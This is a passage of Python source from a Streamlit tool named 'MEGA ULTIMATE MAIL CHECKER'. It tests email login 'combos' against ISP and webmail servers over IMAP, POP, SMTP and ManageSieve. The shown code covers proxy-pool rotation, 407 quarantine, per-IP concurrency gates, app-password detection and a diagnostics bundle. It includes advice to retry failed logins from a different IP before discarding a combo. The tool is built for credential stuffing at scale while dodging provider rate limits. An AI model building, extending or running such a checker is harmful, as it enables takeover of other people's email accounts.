        "SAME_HOST_RETRIES": SAME_HOST_RETRIES_DEFAULT,
        "MAX_ROTATIONS": MAX_ROTATIONS_DEFAULT,
        "CHECK_PASS2": CHECK_PASS2_DEFAULT,
        "POOL_MODE": "all",
        "SELECTED_COUNTRIES": [],
        "SELECTED_MIX_COUNTRIES": [],
        "DYNAMIC_WORKER_SCALING": True,
        "CUSTOM_WHITELIST": [],
        "CUSTOM_BLACKLIST": [],
        "PROXY_FILE": "proxies.txt",
        "RESULTS_DIR": "mail_results",
        "CACHE_FILE": "domain_cache.json",
        "PROXY_META_FILE": "proxy_meta.json",
        "MAX_PROXY_TRIES": 2,
        "PROXY_CONNECT_TIMEOUT": 8.0,
        "FAST_MODE": False,
        "FAILURE_COOLDOWN": FAILURE_COOLDOWN_DEFAULT,
        "RANDOM_ROTATION": True,
        "GEO_CALL": False,
        "CONNECTION_HINT": "Auto",
        "SMTP_CHECK": False,
    }


def _safe_index(options, value, fallback=0):
    """Never let an absent default raise ValueError on a selectbox."""
    try:
        return list(options).index(value)
    except Exception:
        return fallback
# @@END 020 DEFAULT_CFG

# @@BLOCK 021 DOMAIN_TABLES deps=-
WEB_ONLY_HOSTS = {
    "secure.windstream.net",
    "webmail.windstream.net",
    "secure.suddenlink.net",
    "webmail.suddenlink.net",
    "secure.optimum.net",
}

DOMAIN_COUNTRY_HINTS = {
    "windstream.net": "United States",
    "kinetic.net": "United States",
    "mediacombb.net": "United States",
    "mchsi.com": "United States",
    "comcast.net": "United States",
    "cox.net": "United States",
    "charter.net": "United States",
    "spectrum.net": "United States",
    "suddenlink.net": "United States",
    "optimum.net": "United States",
    "optonline.net": "United States",
    "att.net": "United States",
    "sbcglobal.net": "United States",
    "bellsouth.net": "United States",
    "verizon.net": "United States",
    "frontier.com": "United States",
    "centurylink.net": "United States",
    "embarqmail.com": "United States",
    "earthlink.net": "United States",
    "breezeline.net": "United States",
    "armstrong.net": "United States",
    "gmail.com": "United States",
    "outlook.com": "United States",
    "yahoo.com": "United States",
}

APP_PASSWORD_DOMAINS = {
    "gmail.com", "googlemail.com",
    "yahoo.com", "ymail.com", "rocketmail.com", "yahoo.co.uk", "yahoo.fr",
    "yahoo.de", "yahoo.it", "yahoo.es", "yahoo.com.br",
    "aol.com",
}
_APP_PW_16 = re.compile(r"^[a-z]{16}$")
_APP_PW_SPACED = re.compile(r"^(?:[a-z]{4}\s){3}[a-z]{4}$")
# @@END 021 DOMAIN_TABLES

# @@BLOCK 022 EXCEPTION_TYPES deps=-
class ProxyAuthError(ConnectionError):
    """The PROXY rejected our CREDENTIALS (407). The mail host is still untested."""


class ProxyTransportError(ConnectionError):
    """The tunnel broke at the SOCKET level. Not a 407, not a mail verdict."""


class SmtpAuthError(ConnectionError):
    """A CLEAN 535 from submission. A real credential answer. CONFIRM-ONLY."""


class SmtpSoftError(ConnectionError):
    """530 Authentication Required, relay restriction, 504, 4xx greylist."""


class SieveAuthError(ConnectionError):
    """A clean NO from ManageSieve. A real credential answer. CONFIRM-ONLY."""


class SieveSoftError(ConnectionError):
    """ManageSieve said something inconclusive."""


class MsVerdict(Exception):
    """A DEFINITE Microsoft token verdict, carried out of verify_and_connect."""

    def __init__(self, verdict, detail=""):
        super().__init__(detail or verdict)
        self.verdict = verdict
        self.detail = detail or verdict
# @@END 022 EXCEPTION_TYPES

# @@BLOCK 023 SMALL_PREDICATES deps=-
def _is_proxy_auth_fail(msg) -> bool:
    """True when the PROXY ITSELF rejected us, as opposed to a transport failure."""
    m = (msg or "").lower()
    return ("407" in m
            or "proxy authentication required" in m
            or "socks5 authentication failed" in m
            or "socks authentication failed" in m)


def _timeout_kind(err) -> str:
    """'connect' | 'read' | ''."""
    low = str(err).lower()
    if "read operation timed out" in low:
        return "read"
    if "timed out" in low or "timeout" in low:
        return "connect"
    return ""


def _looks_like_app_password(pw) -> bool:
    p = (pw or "").strip()
    if not p:
        return False
    return bool(_APP_PW_16.match(p) or _APP_PW_SPACED.match(p))


def _wrong_detail_note(domain, password) -> str:
    """Honest labelling for the providers where WRONG is ambiguous."""
    d = (domain or "").lower().strip()
    if d in APP_PASSWORD_DOMAINS and not _looks_like_app_password(password):
        return " (may be correct - provider needs an APP PASSWORD for IMAP/POP/SMTP)"
    return ""


def _login_dropped_detail() -> str:
    """The honest readout for a server that answers then hangs up."""
    return ("server accepted LOGIN then closed the socket (* BYE) on every attempt "
            "- usually a rejected password or an app-password requirement; retry from "
            "a different IP or with an app password before discarding the combo")
# @@END 023 SMALL_PREDICATES

# @@BLOCK 024 ENGINE_STATE deps=-
@str_lit.cache_resource(show_spinner=False)
def _engine_state():
    _meta = {}
    try:
        if os.path.exists("proxy_meta.json"):
            with open("proxy_meta.json", encoding="utf-8") as _f:
                _meta = json.load(_f) or {}
    except Exception:
        _meta = {}
    return {
        # locks
        "cache_lock": threading.Lock(),
        "proxy_lock": threading.Lock(),
        "file_write_lock": threading.Lock(),
        "session_state_lock": threading.Lock(),
        "alive_pool_lock": threading.Lock(),
        "host_dns_lock": threading.Lock(),
        "proxy_quarantine_lock": threading.Lock(),
        "proxy_scheme_lock": threading.Lock(),
        "probe_stats_lock": threading.Lock(),
        "probe_log_lock": threading.Lock(),
        "probe_owner_lock": threading.Lock(),
        "rr_lock": threading.Lock(),
        "geo_lock": threading.Lock(),
        "public_ip_lock": threading.Lock(),
        "direct_geo_lock": threading.Lock(),
        "smtp_lock": threading.Lock(),
        "target_reach_lock": threading.Lock(),
        "helo_lock": threading.Lock(),
        # concurrency gates (persistent so a rerun cannot orphan them)
        "host_gate_lock": threading.Lock(),
        "host_gates": {},
        "ip_gates": {},
        "subuser_gates": {},
        "proxy_gate": None,
        # engine / proxy state
        "alive_pool": [],
        "consecutive_proxy_failures": defaultdict(int),
        "circuit_breaker_until": {},
        "failed_domain_cache": {},
        "host_dns_cache": {},
        "proxy_quarantine": set(),
        "strikes_407": defaultdict(int),
        "proxy_scheme": {},
        "probe_stats": {},
        "probe_log": [],
        "meta": _meta,
        "rr_index": 0,
        "rr_last": None,
        # caches that must not be rebuilt on every click
        "geo_cache": {},
        "public_ip": {"ip": "", "ts": 0.0},
        "direct_geo": {"ts": 0.0, "ip": "", "country": "Unknown",
                       "region": "Unknown", "vpn": "Auto"},
        "direct_isp": {"ts": 0.0, "isp": ""},
        "smtp_domain_cache": {},
        "target_reach": {"ts": 0.0, "rows": []},
        "selftest": {"ts": 0.0, "text": ""},
        "helo_name": {"name": "", "ts": 0.0},
        "mail_spot": {"ts": 0.0, "host": "", "port": 0, "ok": 0, "auth": 0,
                      "other": 0, "n": 0, "error": ""},
        # probe bookkeeping
        "probe_in_flight": False,
        "last_probe_ts": 0.0,
        "probe_runs": 0,
        "run_active": False,
        "probe_targets_override": [],
        "bootstrap_done": False,
        "first_probe_kicked": False,
        "process_start": time.time(),
        # STATE-backed so a Streamlit rerun cannot rebuild them EMPTY
        "startup_seen": set(),
        "startup_buffer": [],
        "startup_buffer_lock": threading.Lock(),
        "dns_cache": {},
        "persistent_valid_cache": {"ts": 0.0, "data": []},
        "prev_valid_cache": {"ts": 0.0, "data": set()},
        "geo_fail": {},
        "geo_last_call": {"ts": 0.0},
        "proxy_407_until": {},
        "diag_cache": {"ts": 0.0, "text": ""},
    }


STATE = _engine_state()

probe_stats = STATE["probe_stats"]
probe_stats_lock = STATE["probe_stats_lock"]
probe_log = STATE["probe_log"]
probe_log_lock = STATE["probe_log_lock"]
_PROBE_OWNER_LOCK = STATE["probe_owner_lock"]

_PROBE_REASON_LABEL = {
    "ok": "pass",
    "auth": "407 auth",
    "transport": "transport reset",
    "timeout": "timeout",
    "dead": "dead",
    "tcp": "tcp dead",
    "format": "bad format",
    "nosocks": "no PySocks",
    "blocked": "circuit-broken",
}
# @@END 024 ENGINE_STATE

# @@BLOCK 025 PROBE_TELEMETRY deps=024
def log_probe_event(msg):
    with probe_log_lock:
        probe_log.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        if len(probe_log) > 300:
            del probe_log[:-300]


def record_probe_result(proxy_str, ok, reason, latency_ms=0, target="",
                        scheme=None, error=""):
    if not proxy_str:
        return
    with probe_stats_lock:
        prev = probe_stats.get(proxy_str) or {}
        probe_stats[proxy_str] = {
            "ok": bool(ok),
            "reason": reason or ("ok" if ok else "dead"),
            "ts": time.time(),
            "latency_ms": int(latency_ms or 0),
            "target": target or "",
            "scheme": scheme,
            "error": (error or "")[:300],
            "attempts": int(prev.get("attempts", 0)) + 1,
            "first_seen": prev.get("first_seen") or time.time(),
        }
    STATE["last_probe_ts"] = time.time()


def probe_summary():
    """(passed, auth, timeout, dead) over the most recent probe of each node."""
    with probe_stats_lock:
        snap = list(probe_stats.values())
    passed = sum(1 for v in snap if v.get("ok"))
    auth = sum(1 for v in snap if not v.get("ok") and v.get("reason") == "auth")
    timeout = sum(1 for v in snap if not v.get("ok")
                  and v.get("reason") in ("timeout", "transport"))
    dead = sum(1 for v in snap if not v.get("ok")
               and v.get("reason") not in ("auth", "timeout", "transport"))
    return passed, auth, timeout, dead


def probe_reason_histogram():
    with probe_stats_lock:
        snap = list(probe_stats.values())
    hist = defaultdict(int)
    for v in snap:
        hist[v.get("reason") or "?"] += 1
    return dict(sorted(hist.items(), key=lambda kv: -kv[1]))


def clear_tunnel_cache():
    """Clearing the probe stats is what a re-probe actually needs."""
    with probe_stats_lock:
        probe_stats.clear()
# @@END 025 PROBE_TELEMETRY

# @@BLOCK 026 RUNTIME_HELPERS deps=024
def probe_timeout() -> float:
    try:
        return float(CFG.get("PROBE_TIMEOUT", PROBE_TIMEOUT_DEFAULT))
    except Exception:
        return PROBE_TIMEOUT_DEFAULT


def active_protocols():
    """The selected protocols, always non-empty, IMAP-first."""
    try:
        picked = [p for p in (CFG.get("PROTOCOLS") or []) if p in PROTOCOL_OPTIONS]
    except Exception:
        picked = []
    if not picked:
        picked = list(PROTOCOL_SELECTION_DEFAULT)
    return [p for p in PROTOCOL_OPTIONS if p in picked]


def protocol_flags():
    picked = set(active_protocols())
    return {
        "imap": PROTOCOL_IMAP in picked,
        "pop": PROTOCOL_POP in picked,
        "smtp": PROTOCOL_SMTP in picked,
        "sieve": PROTOCOL_SIEVE in picked,
    }


def probe_targets():
    """Targets for the tunnel probe."""
    try:
        name = CFG.get("PROBE_TARGET", PROBE_TARGET_DEFAULT)
    except Exception:
        name = PROBE_TARGET_DEFAULT
    if name == PROBE_TARGET_AUTO:
        ov = STATE.get("probe_targets_override") or []
        if ov:
            return list(ov)
        return PROBE_TARGET_PORTS[PROBE_TARGET_AUTO]
    return PROBE_TARGET_PORTS.get(name) or PROBE_TARGET_PORTS[PROBE_TARGET_AUTO]


def probe_workers(bulk: bool = False) -> int:
    try:
        if bulk:
            return max(1, int(PROBE_WORKERS_BULK))
        base = PROBE_WORKERS_BUSY if STATE.get("run_active") else PROBE_WORKERS_DEFAULT
        return max(1, int(base))
    except Exception:
        return PROBE_WORKERS_DEFAULT


def _estimated_rung_count():
    """How many rungs a typical account will actually dial."""
    try:
        flags = protocol_flags()
        n = 0
        if flags.get("imap"):
            n += 2
        if flags.get("pop"):
            n += 2
        if flags.get("smtp"):
            n += len(SMTP_RUNG_PORTS)
        if flags.get("sieve"):
            n += 1
        return max(1, n)
    except Exception:
        return 8


def request_budget():
    """Rough proxy-request accounting under the CURRENT settings."""
    try:
        nodes = len(all_proxies)
    except Exception:
        nodes = 0
    per_node = 1 + (1 if CFG.get("PROBE_SECOND_SCHEME",
                                 PROBE_SECOND_SCHEME_DEFAULT) else 0)
    per_node *= max(1, int(CFG.get("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT)))
    try:
        sample = max(0, int(CFG.get("PROBE_SAMPLE_MAX", 0)))
    except Exception:
        sample = 0
    probed = min(nodes, sample) if sample else nodes
    cycle = probed * per_node
    if CFG.get("MAIL_SPOT_CHECK", MAIL_SPOT_CHECK_DEFAULT):
        cycle += min(MAIL_SPOT_NODES, probed)
    if CFG.get("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT):
        idle_per_min = cycle / max(1.0, PROBER_IDLE_SLEEP) * 60.0
    else:
        idle_per_min = 0.0
    rungs = _estimated_rung_count()
    rot = max(1, int(CFG.get("MAX_ROTATIONS", MAX_ROTATIONS_DEFAULT)) + 1)
    passes = 2 if CFG.get("CHECK_PASS2", CHECK_PASS2_DEFAULT) else 1
    return {"cycle": cycle, "idle_per_min": idle_per_min,
            "per_account": rungs * passes * rot * per_node}
# @@END 026 RUNTIME_HELPERS

# @@BLOCK 027 DIAG_ENV deps=-
def _env_info():
    info = {}
    info["python"] = sys.version.replace("\n", " ").strip()
    info["platform"] = platform.platform()
    info["machine"] = platform.machine()
    info["cwd"] = os.getcwd()
    try:
        info["streamlit"] = getattr(str_lit, "__version__", "unknown")
    except Exception:
        info["streamlit"] = "unknown"
    try:
        info["pandas"] = pd.__version__
    except Exception:
        info["pandas"] = "unknown"
    try:
        info["imaplib"] = getattr(imaplib, "__version__", "unknown")
    except Exception:
        info["imaplib"] = "unknown"
    try:
        import socks as _s
        info["pysocks"] = getattr(_s, "__version__", "present(no __version__)")
    except Exception:
        info["pysocks"] = "MISSING"
    try:
        import requests as _r
        info["requests"] = getattr(_r, "__version__", "present")
    except Exception:
        info["requests"] = "MISSING"
    try:
        import dns as _d
        info["dnspython"] = getattr(_d, "version", None) and str(_d.version.version) or "present"
    except Exception:
        info["dnspython"] = "MISSING"
    info["socks_ok_flag"] = SOCKS_OK
    info["hosts_ok"] = HOSTS_OK
    info["hosts_merge"] = _HAVE_HOSTS_MERGE
    info["status_ok"] = STATUS_OK
    info["ms_oauth_ok"] = MS_OAUTH_OK
    info["cfg_version"] = CFG_VERSION
    for f in ("proxies.txt", "proxies_all.txt", "proxy_meta.json", "theme.json",
              "domain_cache.json"):
        try:
            if os.path.exists(f):
                stt = os.stat(f)
                info[f] = (f"{stt.st_size} bytes, mtime "
                           f"{datetime.fromtimestamp(stt.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}")
            else:
                info[f] = "ABSENT"
        except Exception as e:
            info[f] = f"stat error: {e}"
    return info


def _e_for(fn):
    try:
        fn()
        return Exception("no error")
    except Exception as e:
        return e


def _imap_caps_selftest():
    """The exact v13.31 crash, replayed on a fake connection."""
    class _Fake:
        def __init__(self, caps):
            self.capabilities = caps

        def capability(self):
            return "OK", [b"IMAP4REV1 AUTH=PLAIN LOGINDISABLED"]

    lines = []
    cases = {
        "str tuple (what CPython 3.x really gives)": ("IMAP4REV1", "AUTH=PLAIN", "LOGINDISABLED"),
        "bytes tuple (what v13.31 assumed)": (b"IMAP4REV1", b"AUTH=PLAIN", b"LOGINDISABLED"),
        "empty tuple (forces the capability() call)": (),
        "None": None,
        "single str (not a tuple)": "IMAP4REV1 AUTH=PLAIN",
    }
    for label, caps in cases.items():
        try:
            m = _Fake(caps)
            got = sorted(_imap_caps(m))
            wants = "LOGINDISABLED" in got
            verdict = "wants AUTHENTICATE PLAIN" if wants else "will use LOGIN"
            lines.append(f"  OK   {label:46} -> caps={len(got):2} {verdict}")
        except Exception as e:
            lines.append(f"  FAIL {label:46} -> {type(e).__name__}: {e}")
    try:
        lines.append("  repro: b' '.join(str tuple) raises "
                     f"{type(_e_for(lambda: b' '.join(('IMAP4REV1',)))).__name__}")
    except Exception:
        pass
    return lines


def _probe_target_reachability(force=False):
    now = time.time()
    with STATE["target_reach_lock"]:
        cached = STATE.get("target_reach") or {}
        if not force and cached.get("rows") and (now - cached.get("ts", 0)) < 300:
            return cached["rows"]
    rows = []
    for host, port, label in PROBE_TARGET_PORTS["both (either)"]:
        row = {"target": f"{host}:{port}", "label": label}
        t0 = time.time()
        try:
            s = socket.create_connection((host, int(port)), timeout=3.0)
            s.close()
            row["ok"] = True
            row["ms"] = int((time.time() - t0) * 1000)
            row["err"] = ""
        except Exception as e:
            row["ok"] = False
            row["ms"] = int((time.time() - t0) * 1000)
            row["err"] = f"{type(e).__name__}: {str(e)[:120]}"
        try:
            row["resolved"] = socket.gethostbyname(host)
        except Exception as e:
            row["resolved"] = f"DNS FAIL {type(e).__name__}"
        rows.append(row)
    with STATE["target_reach_lock"]:
        STATE["target_reach"] = {"ts": now, "rows": rows}
    return rows
# @@END 027 DIAG_ENV

# @@BLOCK 028 DIAG_PROXY_AUDIT deps=-
def _detect_line_format(line):
    p = (line or "").strip()
    if not p:
        return "empty"
    if "://" in p:
        return "scheme:// (url form)"
    if "@" in p:
        return "user:pass@host:port"
    parts = p.split(":")
    if len(parts) == 4:
        return "host:port:user:pass"
    if len(parts) == 2:
        return "host:port (NO CREDS)"
    return f"UNRECOGNISED ({len(parts)} colon-parts)"


def _analyze_proxy_file():
    out = {"exists": False, "total": 0, "unique": 0, "with_creds": 0,
           "unparsable": 0, "formats": {}, "dupe_map": {}, "sample": [],
           "distinct_ips": 0, "distinct_users": 0}
    try:
        if not os.path.exists("proxies.txt"):
            return out
        out["exists"] = True
        with open("proxies.txt", encoding="utf-8", errors="ignore") as f:
            raw = [l.rstrip("\n") for l in f]
        lines = [l.strip() for l in raw if l.strip() and not l.startswith("#")]
        out["total"] = len(lines)
        out["unique"] = len(list(dict.fromkeys(lines)))
        out["sample"] = lines[:10]
        ips, users = set(), set()
        for l in lines:
            fmt = _detect_line_format(l)
            out["formats"][fmt] = out["formats"].get(fmt, 0) + 1
            if "@" in l:
                out["with_creds"] += 1
            info = parse_proxy(l)
            if not info:
                out["unparsable"] += 1
                continue
            ips.add(info["host"])
            if info.get("user"):
                users.add(info["user"])
            hp = f"{info['host']}:{info['port']}"
            out["dupe_map"][hp] = out["dupe_map"].get(hp, 0) + 1
        out["distinct_ips"] = len(ips)
        out["distinct_users"] = len(users)
    except Exception as e:
        out["error"] = str(e)
    return out
# @@END 028 DIAG_PROXY_AUDIT

# @@BLOCK 029 DIAG_THREADS deps=-
def _thread_report():
    return [f"{t.name} | daemon={t.daemon} | alive={t.is_alive()}"
            for t in threading.enumerate()]


def _thread_stats():
    names = [t.name for t in threading.enumerate()]
    return {
        "total": len(names),
        "executor": sum(1 for n in names if n.startswith("ThreadPoolExecutor")),
        "scriptrunner": sum(1 for n in names if "ScriptRunner" in n),
        "alivepool": sum(1 for n in names if n == "alive-pool"),
        "firstprobe": sum(1 for n in names if n == "first-probe"),
        "startrefresh": sum(1 for n in names if n == "start-refresh"),
    }
# @@END 029 DIAG_THREADS

# @@BLOCK 030 DIAG_BUNDLE deps=025,027,028,029
def build_diagnostics_text():
    L = []

    def A(s=""):
        L.append(str(s))

    A("=" * 78)
    A(f"MEGA ULTIMATE MAIL CHECKER - {BUILD_TAG} DIAGNOSTIC BUNDLE")
    A(f"generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    A("=" * 78)

    A("")
    A("--- 0. IF YOU SEE 'TypeError: Importing a module script failed.' ---")
    A("  That string is SAFARI / iOS WebView's message for a DYNAMIC JAVASCRIPT")
    A("  CHUNK that failed to load.  Streamlit lazy-loads chunks with a content")
    A("  hash in the filename, so a redeploy changes every hash and an already-open")
    A("  tab keeps requesting the OLD names -> 404 -> one red box per failed chunk.")
    A("  NOT a Python error, NOT app.py.  FIX: hard-refresh (Ctrl/Cmd+Shift+R).")

    A("")
    A("--- 1. ENVIRONMENT ---")
    for k, v in _env_info().items():
        A(f"  {k:16}: {v}")
    A("  imaplib caps   : _get_capabilities() decodes with str(dat[-1], enc) "
      "=> mail.capabilities is a tuple of STR on CPython 3.x")

    A("")
    A("--- 1b. _imap_caps() REGRESSION SELF-TEST ---")
    for line in _imap_caps_selftest():
        A(line)

    A("")
    A("--- 1c. * BYE CLASSIFIER SELF-TEST ---")
    for _raw, _want in (
        ("command: LOGIN => IMAP server terminating connection", LOGIN_DROPPED),
        ("* BYE Connection is closed", LOGIN_DROPPED),
        ("* BYE Auth process broken", LOGIN_DROPPED),
        ("* BYE Too many simultaneous connections", RETRY_LATER),
        ("* BYE Too many invalid IMAP commands", RETRY_LATER),
        ("socket error: timed out", CONNECTION_FAILED),
        ("connection reset by peer", CONNECTION_FAILED),
        ("NO [AUTHENTICATIONFAILED] Invalid credentials", WRONG_PASSWORD),
        ("Socket error: 407: Proxy Authentication Required", CONNECTION_FAILED),
    ):
        try:
            _got = st_classify(_raw)
        except Exception as _ce:
            _got = f"<{_ce}>"
        A(f"  {'OK  ' if _got == _want else 'FAIL'} {_raw[:52]:54} -> {_got}"
          f"{'' if _got == _want else f'  (wanted {_want})'}")

    A("")
    A("--- 2. ACTIVE CONFIG (CFG) ---")
    try:
        for k in sorted(CFG.keys()):
            A(f"  {k:28}: {CFG.get(k)}")
    except Exception as e:
        A(f"  CFG unavailable: {e}")

    A("")
    A("--- 3. PROXY FILE AUDIT (proxies.txt) ---")
    fa = _analyze_proxy_file()
    A(f"  exists            : {fa.get('exists')}")
    A(f"  total lines       : {fa.get('total')}")
    A(f"  unique lines      : {fa.get('unique')}")
    A(f"  DISTINCT IPs      : {fa.get('distinct_ips')}   <-- the number that matters")
    A(f"  DISTINCT users    : {fa.get('distinct_users')}   <-- the 407 limit is per USER")
    A(f"  lines with '@'    : {fa.get('with_creds')}")
    A(f"  unparsable lines  : {fa.get('unparsable')}")
    A(f"  detected formats  : {fa.get('formats')}")
    A(f"  error             : {fa.get('error', '-')}")
    A("  -- first 10 lines VERBATIM --")
    for i, l in enumerate(fa.get("sample") or []):
        A(f"    [{i}] {l}")
    A("  -- host:port -> how many lines reference it (top 20) --")
    dm = sorted((fa.get("dupe_map") or {}).items(), key=lambda kv: -kv[1])[:20]
    if dm:
        for hp, n in dm:
            A(f"    {hp:28} x{n}")
    else:
        A("    (none parsed)")
    try:
        if os.path.exists("proxies_all.txt"):
            with open("proxies_all.txt", encoding="utf-8", errors="ignore") as _pa:
                A(f"  proxies_all.txt   : {sum(1 for l in _pa if l.strip())} raw line(s) backed up")
        else:
            A("  proxies_all.txt   : ABSENT (written by the next Fetch & Test)")
    except Exception as _pae:
        A(f"  proxies_all.txt   : stat error {_pae}")

    A("")
    A("--- 4. PROBE-TARGET REACHABILITY FROM THIS APP HOST (direct, no proxy) ---")
    for r in _probe_target_reachability():
        A(f"  {r['target']:24} resolved={r.get('resolved', '?'):18} "
          f"tcp={'OK' if r['ok'] else 'FAIL'} {r['ms']}ms {r['err']}")

    A("")
    A("--- 5. EGRESS IDENTITY (this app host) ---")
    try:
        g = direct_geo()
        A(f"  ip={g.get('ip')} country={g.get('country')} "
          f"region={g.get('region')} vpn={g.get('vpn')}")
        A(f"  isp={direct_isp()[:120]}")
    except Exception as e:
        A(f"  geo error: {e}")

    A("")
    A("--- 6. POOL STATE ---")
    A(f"  selected protocols  : {active_protocols()}")
    A(f"  loaded proxies      : {len(all_proxies)}")
    A(f"  filtered pool       : {len(filtered_pool)}")
    A(f"  alive pool          : {len(alive_pool)}")
    A(f"  quarantined (407)   : {quarantine_size()}")
    A(f"  probe_in_flight     : {STATE.get('probe_in_flight')}")
    A(f"  probe lock held     : {_PROBE_OWNER_LOCK.locked()}")
    A(f"  first_probe_kicked  : {STATE.get('first_probe_kicked')}")
    A(f"  run_active          : {STATE.get('run_active')}")
    A(f"  probe_runs          : {STATE.get('probe_runs')}")
    A(f"  CONFIRM_WRONG_ACROSS_HOSTS: {CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')}")
    A(f"  ALLOW_SELF_SIGNED / TLS_STRICT: "
      f"{CFG.get('ALLOW_SELF_SIGNED')} / {CFG.get('TLS_STRICT')}")
    _lp = STATE.get("last_probe_ts", 0.0)
    A(f"  last_probe         : {int(time.time() - _lp)}s ago" if _lp else "  last_probe         : never")
    A(f"  process uptime     : {int(time.time() - STATE.get('process_start', time.time()))}s")
    A(f"  probe target/budget: {CFG.get('PROBE_TARGET')} / {probe_timeout():.0f}s "
      f"/ strict={CFG.get('PROBE_STRICT')}")
    A(f"  probe targets(live): {[t[0] + ':' + str(t[1]) for t in probe_targets()]}")
    A(f"  probe workers      : {probe_workers()} idle/run, {probe_workers(bulk=True)} bulk "
      f"(batch budget {PROBE_BATCH_BUDGET:.0f}s)")
    _ms = STATE.get("mail_spot") or {}
    if _ms.get("n"):
        A(f"  MAIL-DEST SPOT      : {_ms['host']}:{_ms['port']} -> pass={_ms['ok']} "
          f"407={_ms['auth']} other={_ms['other']} of {_ms['n']} node(s), "
          f"{int(time.time() - _ms.get('ts', 0))}s ago")
        if _ms.get("auth") and not _ms.get("ok"):
            A("  *** pool passes the WEB probe but the provider 407s MAIL destinations ***")
        if _ms.get("error"):
            A(f"  spot error          : {_ms['error'][:200]}")
    else:
        A("  MAIL-DEST SPOT      : not run yet")
    A(f"  HOST_CONCURRENCY    : {CFG.get('HOST_CONCURRENCY')}")
    A(f"  PROXY_CONCURRENCY   : {CFG.get('PROXY_CONCURRENCY')}")
    A(f"  PROXY_IP_CONCURRENCY: {CFG.get('PROXY_IP_CONCURRENCY')}")
    A(f"  PROXY_SUBUSER_CONC  : {CFG.get('PROXY_SUBUSER_CONCURRENCY')}   <-- 407 control")
    _rb = request_budget()
    A(f"  REQUEST BUDGET      : ~{_rb['per_account']} proxy req/account - "
      f"{_rb['idle_per_min']:.0f}/min idle probing - {_rb['cycle']} per pool cycle")
    A(f"  PROBE_MAX_TARGETS   : {CFG.get('PROBE_MAX_TARGETS')}")
    A(f"  PROBE_SECOND_SCHEME : {CFG.get('PROBE_SECOND_SCHEME')}")
    A(f"  PROBER_IDLE_ENABLED : {CFG.get('PROBER_IDLE_ENABLED')}")
    A(f"  PROBE_SAMPLE_MAX    : {CFG.get('PROBE_SAMPLE_MAX')}")
    A(f"  MAIL_SPOT_CHECK     : {CFG.get('MAIL_SPOT_CHECK')}")
    A(f"  MAX_ROTATIONS       : {CFG.get('MAX_ROTATIONS')}")
    A(f"  CHECK_PASS2         : {CFG.get('CHECK_PASS2')}")
    A(f"  DIRECT_FIRST        : {CFG.get('DIRECT_FIRST')}")
    A(f"  RANDOM_ROTATION     : {CFG.get('RANDOM_ROTATION')}")
    A(f"  CONNECT_FLOOR/READ  : {CONNECT_FLOOR_DEFAULT} / {READ_FLOOR_DEFAULT}")
    A(f"  LEGACY RUNG LEASH   : {LEGACY_RUNG_TIMEOUT}s on ports {LEGACY_PORTS}")
    A(f"  407 CONTRACT        : quarantine={PROXY_407_QUARANTINE} "
      f"force_direct={PROXY_407_FORCE_DIRECT} cooldown={PROXY_407_COOLDOWN:.0f}s "
      f"same_host_retries={CFG.get('SAME_HOST_RETRIES')}")
    A(f"  HELO name           : {smtp_helo_name()}")

    A("")
    A("--- 7. PROBE REASON HISTOGRAM (most recent probe per node) ---")
    for r, n in probe_reason_histogram().items():
        A(f"  {_PROBE_REASON_LABEL.get(r, r):16}: {n}")

    A("")
    A("--- 8. PER-NODE TABLE ---")
    A("  key | host:port | user | reason | lat_ms | attempts | country | last_error")
    with probe_stats_lock:
        psnap = dict(probe_stats)
    with proxy_lock:
        msnap = dict(proxy_meta)
    for k in sorted(set(list(psnap.keys()) + list(msnap.keys()))):
        ps = psnap.get(k) or {}
        m = msnap.get(k) or {}
        info = parse_proxy(k)
        hp = f"{info['host']}:{info['port']}" if info else "UNPARSABLE"
        user = (info.get("user") if info else "") or "-"
        A(f"  {k} | {hp} | {user} | {ps.get('reason', '-')} | "
          f"{ps.get('latency_ms', 0)} | {ps.get('attempts', 0)} | "
          f"{m.get('country', '?')} | {ps.get('error', '')}")

    A("")
    A("--- 9. QUARANTINE / CIRCUIT BREAKERS ---")
    with proxy_quarantine_lock:
        A(f"  quarantined: {sorted(proxy_quarantine)}")
    A(f"  407 strikes: {dict(_proxy_407)}")
    now = time.time()
    A("  circuit-broken (30s): "
      f"{ {k: f'{v - now:.0f}s left' for k, v in circuit_breaker_until.items() if v > now} }")
    with _proxy_scheme_lock:
        A(f"  scheme memory: {dict(_proxy_scheme)}")
    A(f"  407 cooldown map entries: {len(STATE.get('proxy_407_until') or {})}")

    A("")
    A("--- 10. CACHES & THREADS ---")
    with probe_stats_lock:
        A(f"  probe_stats entries : {len(probe_stats)}")
    A(f"  proxy_meta entries  : {len(proxy_meta)}")
    A(f"  geo cache entries   : {len(_GEO_CACHE)} (negative cache: {len(_GEO_FAIL)})")
    A(f"  dns cache entries   : {len(_DNS_CACHE)} (shared, TTL {_DNS_TTL:.0f}s)")
    A(f"  startup dedupe set  : {len(_STARTUP_SEEN)}")
    with _SMTP_LOCK:
        A(f"  smtp cache entries  : {len(_SMTP_DOMAIN_CACHE)}")
    _ts = _thread_stats()
    A(f"  live threads        : {_ts['total']} (ThreadPoolExecutor={_ts['executor']}, "
      f"ScriptRunner={_ts['scriptrunner']}, alive-pool={_ts['alivepool']}, "
      f"first-probe={_ts['firstprobe']}, start-refresh={_ts['startrefresh']})")
    A("  threads:")
    for t in _thread_report():
        A(f"    {t}")

    A("")
    A("--- 11. RECENT PROBE EVENTS (last 60) ---")
    with probe_log_lock:
        tail = list(probe_log)[-60:]
    for e in tail:
        A(f"  {e}")
    if not tail:
        A("  (none)")

    A("")
    A("--- 12. STARTUP LOG TAIL (last 60) ---")
    for e in startup_panel_lines()[-60:]:
        A(f"  {e}")

    A("")
    A("=" * 78)
    A("END OF DIAGNOSTIC BUNDLE")
    A("=" * 78)
    return "\n".join(L)
# @@END 030 DIAG_BUNDLE

# @@BLOCK 031 THEME_DATA deps=-
THEME_FILE = "theme.json"

THEME_PRESETS = {
    "Aurora":    {"g1": "#667eea", "g2": "#764ba2", "accent": "#8b5cf6", "accent2": "#22d3ee", "bg": "#0b1020", "panel": "#141b30", "text": "#e6ebff"},
